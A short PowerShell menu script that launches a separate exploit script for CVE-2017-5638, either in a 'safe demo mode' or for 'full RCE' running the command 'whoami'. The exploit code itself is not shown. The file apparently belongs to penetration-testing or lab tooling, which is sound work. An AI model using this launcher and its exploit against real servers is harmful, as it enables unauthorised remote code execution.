While ($true) {
    $Host.UI.RawUI.FlushInputBuffer()
    $s = Read-Host "Enter 0 to run the exploit in safe demo mode, or 1 for full RCE, enter e to exit"
    switch ($s.Trim()) {
        '0' {
            Write-Host "Running in safe demo mode...`n"
            .\exploit_cve_2017_5638.ps1 -DemoMode
        }
        '1' {
            Write-Host "Running with full RCE...`n"
            .\exploit_cve_2017_5638.ps1 -Command "whoami"
        }
        'e' {
            Write-Host "Exiting...`n"
            exit
        }
        default {
            Write-Host "Invalid choice. Please enter 0, 1, or e."
        }
    }
}